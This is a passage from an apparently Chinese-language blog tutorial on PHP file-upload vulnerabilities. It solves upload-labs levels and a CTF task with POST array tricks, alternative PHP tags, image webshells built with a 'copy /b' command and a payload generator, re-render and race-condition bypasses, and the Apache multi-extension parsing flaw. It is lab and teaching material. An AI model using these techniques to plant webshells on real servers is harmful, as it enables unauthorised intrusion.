<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p>这里首先判断是否有 <code>save_name</code> 表单字段提交，如果没有则使用 <code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code> 作为文件名。然后使用 <code>explode()</code> 函数按照 <code>.</code> 符号将文件名分割成一个数组。最后使用 <code>end()</code> 函数获取数组中最后一个元素，即文件扩展名。</p>
<p><code>end()</code> 函数将数组内部指针指向最后一个元素，并返回该元素的值，所以这个函数可以接受数组的。<code>reset()</code> 函数将内部指针指向数组中的第一个元素，并输出，所以这个函数也可以接受数组的。<code>count()</code> 统计数组有多少个元素</p>
<p>最最关键的一点是：<code>$_POST[&#39;save_name&#39;]</code> 可控，那么就可以从这一点入手：</p>
<p>用 post 方法传入如下两个参数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">save_name[<span class="number">0</span>]= upload-<span class="number">20</span>.php</span><br><span class="line">save_name[<span class="number">2</span>]= jpg</span><br></pre></td></tr></table></figure>

<p>经过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure>

<p>拼接后的名字为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload-20.php + &quot;.&quot; + save_name[1]的数据</span><br></pre></td></tr></table></figure>

<p>由于<code> save_name[1]</code> 为 NULL ，结果为 <code>upload-20.php.</code></p>
<p>那么就回到黑名单中的点绕过了</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6c4b543e833710bd0c7e62e4c8c2fb20.png" alt="image-20240508111840210"><br>注意：抓包后只有一个 post 上传数据，所以图中选中的数据是复制上面的 post 数据并加以更改</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/b6d0961a3b9aa96b9faa267e25ee59e8.png" alt="image-20240508112152367"></p>
</li>
</ul>
<h4 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h4><h5 id="php-标签检测"><a href="#php-标签检测" class="headerlink" title="php 标签检测"></a>php 标签检测</h5><p>检测并过滤上传文件中包含的 <code>&lt;?php</code> 内容。</p>
<p>php 标签的 4 种写法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;tag&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>正常写法，可能会被过滤，这时就要采用后面的3种写法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> </span><br><span class="line">    <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;tag&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>短标签写法，<code>&lt;?=</code>就相当于<code>&lt;?php echo</code>；如果配置文件 php.ini 中 <code>short_open_tag = On</code>，则可以用<code>&lt;?</code>代替<code>&lt;?php</code>。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">     echo <span class="title function_">md5</span>(<span class="string">&#x27;tag&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>适用于 php7 以前的版本。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;tag&#x27;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>需要通过 php.ini 配置文件中的指令<code>asp_tags=On</code>打开后才可用。</p>
<h5 id="文件幻数检测"><a href="#文件幻数检测" class="headerlink" title="文件幻数检测"></a>文件幻数检测</h5><p>文件幻数（magic number），它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。</p>
<p>通常情况下，通过判断前10个字节，基本就能判断出一个文件的真实类型。</p>
<p>绕过方式（制作图片马）：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">GitHub - huntergregal&#x2F;PNG-IDAT-Payload-Generator: Generate a PNG with a payload embedded in the IDAT chunk (Based off of previous concepts and code – credit in README)</a></p>
<p>查看帮助：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python generate.py -h </span><br></pre></td></tr></table></figure>

<p>制作图片马：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python generate.py -m php -o png.php</span><br></pre></td></tr></table></figure>

<p>基本使用方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usage: generate.py [-h] [-q] -m &#123;xss,php&#125; [-r REMOTE_DOMAIN] -o OUTPUT_IMAGE [-u UPDATE] [-p PAYLOAD] [-t THREADS]</span><br><span class="line"></span><br><span class="line">Tool to generate PNG-IDAT Payloads.</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -q, --quiet           Optional: quiet mode</span><br><span class="line">  -m &#123;xss,php&#125;, --method &#123;xss,php&#125;</span><br><span class="line">                        Choose payload method, -h to view available methods</span><br><span class="line">  -r REMOTE_DOMAIN, --remote-domain REMOTE_DOMAIN</span><br><span class="line">                        Remote domain to retrieve payload from (shorter the better: ex. xx.xxx. use xqi.cc for generic XSS)</span><br><span class="line">  -o OUTPUT_IMAGE, --output-file OUTPUT_IMAGE</span><br><span class="line">                        Output payload to PNG file</span><br><span class="line">  -u UPDATE, --update UPDATE</span><br><span class="line">                        Update the payload tables</span><br><span class="line">  -p PAYLOAD, --payload PAYLOAD</span><br><span class="line">                        Use the provided payload - no bruteforce</span><br><span class="line">  -t THREADS, --threads THREADS</span><br><span class="line">                        Number of threads to use for bruteforce</span><br></pre></td></tr></table></figure>

<p>也可以通过命令制作简单的图片马，看下面例子</p>
<p>实例：</p>
<p>upload-labs Pass-13：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/f3b1fab1f2418ecfb58f22818098c50f.png" alt="image-20240508165852295"></p>
<p>该代码会验证上传内容，确认是图片格式，所以不能简单把 php 转化为 jpg，此时就需要使用图片木马</p>
<p>我们的做法是在正常图片里面加入恶意代码</p>
<p>执行以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> image.png /b + webshell.php /a webshell.png</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/2607df00521cf71312de3832844b2666.png" alt="image-20240508170347678"></p>
<p>成功上传！点击 <strong>文件包含漏洞</strong>，进入文件包含页面：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/61f6b95d8483b5ba205bdc9e5b037b64.png" alt="image-20240508170522191"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>以 get 方式传入上传的图片木马，使其文件包含</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/19272e730c19a0e2fcdc01e40a8231af.png" alt="image-20240508170714169"></p>
<h5 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h5><p>就是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到特殊的数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。</p>
<p>绕过方式：</p>
<p>先上传一张图片，再重新将图片下载下来做比较，然后在相同的地方插入 webshell，然后重新上传，配合文件包含漏洞执行 webshell。</p>
<p>实例：</p>
<p>0xGame 2023 WEB [Week 2] ez_upload</p>
<p>先上传一张 gif 图片（ gif 二次渲染最方便）</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/1f128c631cd43df99a77a1df746f9cbf.png" alt="image-20231030212159687"></p>
<p>访问后将上传的文件下载到桌面</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e6f911f2ac329b9d78fca9ab6eb05ef6.png" alt="image-20231030212337199"></p>
<p>将两张图片用 010 Editor 打开，蓝色部分为二次渲染前后不变的部分，我们要将 shell 替换同数量的字符（尽量将 shell 写在图片中间）</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/5f4a42f151720fc13dd6ac32b62a05b2.png" alt="image-20231030212459609"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6b7d7d6b6d5cf8568a2ac3ad74271e0f.png" alt="image-20231030215903623"></p>
<p>打开 Burp Suite 抓包，将文件后缀改为 php，那么就会执行 shell</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9a2e4e4e2ce86a2312225fe113da4d77.png" alt="image-20231030220105765"></p>
<p>访问传入的 shell，发现执行成功</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/6fe3ded24f6c57d9eb1ec238259dfed1.png" alt="image-20231030215946613"></p>
<p>最终连蚁剑得 flag</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/e2f1ff930c1522b13c6a57e6a35a59e4.png" alt="image-20231030215743211"></p>
<h3 id="其他绕过方式"><a href="#其他绕过方式" class="headerlink" title="其他绕过方式"></a>其他绕过方式</h3><h4 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h4><p>实例：</p>
<p>upload-labs Pass-18：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从源码来看，服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是 jpg、png、gif 中的一种，就将文件进行重命名。如果不符合的话，<code>unlink()</code> 函数就会删除该文件。</p>
<p>直接上传一句话木马的话，上传上去就被删除了，我还怎么去访问啊？</p>
<p>不慌不慌，要知道代码执行的过程是需要耗费时间的。如果我们能在上传的一句话被删除之前访问不就成了。这个也就叫做条件竞争上传绕过。</p>
<p>我们可以利用 burp 多线程发包，然后不断在浏览器访问我们的 webshell，会有一瞬间的访问成功。</p>
<p>我是这么想的：在浏览器访问我们的 webshell 实际上是发送数据包，而上传文件也是发送数据包，那么我们就可以设置两个爆破来自动化进行条件竞争<br><img src="https://img-blog.csdnimg.cn/img_convert/5d975651c08602c4ef0b3ac4fbbc2e7f.png" alt="image-20240508125639733"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/794edc71105ddc8c7c2197539186a230.png" alt="image-20240508125600855"></p>
<p>payload 改为 NULL payload</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/753dbd92c1eb63835f62d6d61bd25165.png" alt="image-20240508125823581"></p>
<p>回显 123，说明文件被成功解析！接下来想连蚁剑连蚁剑，想直接命令执行就命令执行</p>
<h4 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h4><p>实例：</p>
<p>upload-labs Pass-19：</p>
<p>myupload.php</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ccb966e06c2484f71adccf72df805372.png" alt="image-20240508113233558"></p>
<p>这代码一看就是白名单，只允许上传这里面的文件，所以不能传 php 等文件</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br></pre></td></tr></table></figure>

<p>文件上传之后又对其进行了重命名，不能使用文件包含的漏洞。</p>
<p>结合 apache 的解析漏洞，考虑 apache 未知扩展名解析漏洞：不管最后后缀为什么，只要是 <code>.php.*</code> 结尾，就会被 Apache 服务器解析成 php 文件！</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ffffee62f9afefc0e8701b2a11fca03c.png" alt="image-20240508113946403"></p>
<p>这里是先移动文件，再修改文件名，所以存在利用条件竞争</p>
<p>直接把上面的 payload 改改就行了：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ee260ad8d27c423e32e3d78c9e51acbe.png" alt="image-20240508130823142"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/26c0f9d851ca164840d1910a9e9de30c.png" alt="image-20240508130859177"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/da3fe35811b4f9335a7946a1f21f8a5a.png" alt="image-20240508130939627"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Ed3n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/04/02/PHP%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">http://example.com/2024/04/02/PHP%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Ed3n's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><a class="post-meta__tags" href="/tags/upload-labs/">upload -labs</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/02/ctfshow%20XEE%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="ctfshow XXE 刷题记录"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ctfshow XXE 刷题记录</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/11/XXE%20%E6%BC%8F%E6%B4%9E/" title="XXE 学习记录"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XXE 学习记录</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ed3n</div><div class="author-info__description">欢迎光临，我的朋友</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell"><span class="toc-number">1.1.</span> <span class="toc-text">webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86-WebShell"><span class="toc-number">1.1.1.</span> <span class="toc-text">认识 WebShell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#webshell-%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">webshell 概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%98%E7%82%B9"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">优点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.1.1.3.1.</span> <span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%8F%E9%A9%AC"><span class="toc-number">1.1.1.3.2.</span> <span class="toc-text">小马</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%A7%E9%A9%AC"><span class="toc-number">1.1.1.3.3.</span> <span class="toc-text">大马</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text">认识文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%BB%A3%E7%A0%81%E5%9F%BA%E7%A1%80"><span class="toc-number">1.3.</span> <span class="toc-text">PHP 实现文件上传的代码基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">文件检测机制与绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">文件头检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.2.</span> <span class="toc-text">客户端检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%EF%BC%9A"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">实例：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.3.</span> <span class="toc-text">服务端检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MIME-%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">MIME 类型检测</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%EF%BC%9A-1"><span class="toc-number">1.4.3.1.1.</span> <span class="toc-text">实例：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">文件后缀检测</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.3.2.1.</span> <span class="toc-text">黑名单检测</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%A1%AE%E8%AE%A4%E6%98%AF%E5%90%A6%E6%98%AF%E9%BB%91%E5%90%8D%E5%8D%95%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.3.2.1.1.</span> <span class="toc-text">如何确认是否是黑名单检测</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.3.2.1.2.</span> <span class="toc-text">绕过方式</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.3.2.2.</span> <span class="toc-text">白名单检测</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%A1%AE%E8%AE%A4%E6%98%AF%E5%90%A6%E6%98%AF%E7%99%BD%E5%90%8D%E5%8D%95%E6%A3%80%E6%B5%8B"><span 